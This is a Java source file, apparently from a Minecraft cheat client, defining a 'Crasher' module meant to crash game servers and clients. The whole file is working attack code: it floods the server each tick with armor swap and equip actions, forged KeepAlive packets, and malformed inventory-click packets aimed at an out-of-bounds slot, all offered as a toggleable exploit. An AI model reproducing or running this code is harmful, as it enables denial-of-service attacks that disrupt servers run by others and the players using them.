package net.shoreline.client.impl.module.exploit;

import net.shoreline.client.api.config.Config;
import net.shoreline.client.api.config.setting.EnumConfig;
import net.shoreline.client.api.event.EventStage;
import net.shoreline.client.api.event.listener.EventListener;
import net.shoreline.client.api.module.ModuleCategory;
import net.shoreline.client.api.module.ToggleModule;
import net.shoreline.client.impl.event.TickEvent;
import net.shoreline.client.impl.event.network.PacketEvent;
import net.shoreline.client.init.Managers;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.item.ArmorItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.s2c.play.KeepAliveS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.shoreline.client.util.Globals;

/**
 *
 *
 * @author linus
 * @since 1.0
 */
public class CrasherModule extends ToggleModule
{
    //
    Config<CrasherMode> modeConfig = new EnumConfig<>("Mode", "The exploit " +
            "mode to use when crashing", CrasherMode.ARMOR, CrasherMode.values());
    //
    private long keepAliveId;

    /**
     *
     */
    public CrasherModule()
    {
        super("Crasher", "Attempts to crash poorly configured clients/servers",
                ModuleCategory.EXPLOITS);
    }

    /**
     *
     * @param event
     */
    @EventListener
    public void onTick(TickEvent event)
    {
        if (event.getStage() != EventStage.PRE)
        {
            return;
        }
        switch (modeConfig.getValue())
        {
            case ARMOR ->
            {
                for (int i = 0; i < 300; i++)
                {
                    if (mc.player.getInventory().getStack(38).getItem() != Items.AIR)
                    {
                        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId,
                                6, 0, SlotActionType.SWAP, mc.player);
                    }
                    if (mc.player.getMainHandStack().getItem() instanceof ArmorItem)
                    {
                        mc.interactionManager.interactItem(mc.player, Hand.MAIN_HAND);
                    }
                }
            }
            case CONSOLE ->
            {
                for (int i = 0; i < 5; i++)
                {
                    KeepAliveC2SPacket packet =
                            new KeepAliveC2SPacket(keepAliveId++);
                    try
                    {
                        Managers.NETWORK.sendPacket(packet);
                    }
                    catch (Exception e)
                    {
                        e.printStackTrace();
                    }
                }
            }
            case OUT_OF_BOUNDS ->
            {
                for (int i = 0; i < 100; i++)
                {
                    ItemStack stack = new ItemStack(mc.player.getMainHandStack().getItem());
                    ClickSlotC2SPacket packet = new ClickSlotC2SPacket(0, 69,
                            mc.player.currentScreenHandler.getRevision(), 1,
                            SlotActionType.QUICK_MOVE, stack, new Int2ObjectOpenHashMap<>());
                    try
                    {
                        Managers.NETWORK.sendPacket(packet);
                    }
                    catch (Exception e)
                    {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

    /**
     *
     * @param event
     */
    @EventListener
    public void onPacketInbound(PacketEvent.Inbound event)
    {
        if (event.getPacket() instanceof KeepAliveS2CPacket packet)
        {
            keepAliveId = packet.getId();
        }
    }

    public enum CrasherMode
    {
        ARMOR,
        CONSOLE,
        OUT_OF_BOUNDS
    }
}
